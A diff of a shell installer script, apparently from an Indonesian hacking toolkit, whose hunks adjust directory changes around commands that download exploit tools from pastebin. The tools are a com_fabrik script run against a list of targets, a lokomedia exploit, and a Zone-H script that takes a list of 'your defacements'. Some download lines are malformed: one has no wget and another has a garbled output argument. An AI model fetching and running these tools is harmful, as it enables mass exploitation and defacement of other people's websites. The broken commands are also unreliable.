@@ -175,9 +175,9 @@ apt install wget
 apt install curl
 apt install php
 mkdir com_fabrik
-cd ~/ com_fabrik
+cd com_fabrik
 wget https://pastebin.com/raw/LDvFvtUD -O com_fabrik.php
-cd ~/
+cd 
 mv com_fabrik/ $HOME
 echo -e $red " Done Sudah Terinstall Stah "
 echo -e $white " Usage : php com_fabrik.php target.txt "
@@ -193,9 +193,9 @@ apt update && apt upgrade
 apt install wget
 apt install php
 mkdir lokomed
-cd ~/ lokomed
+cd lokomed
 https://pastebin.com/raw/sPpJRjCZ -O lokomedia.php
-cd ~/
+cd 
 echo -e $red " Done Sudah Terinstall Stah "
 echo -e $white " Usage : php lokomedia.php a.txt "
 fi
@@ -224,9 +224,9 @@ apt update && apt upgrade
 apt install php
 apt install wget
 mkdir Zone-H
-cd ~/ Zone-H
+cd Zone-H
 wget https://pastebin.com/raw/zNhnyLYL php ZoneH.php
-cd ~/
+cd 
 mv Zone-H/ $HOME
 echo -e $red " Done Sudah Terinstall Stah "
 echo -e $white " Notice : Buatlah Sebuah File source list.txt pada memory dan isi dengan url bekas defacemu "
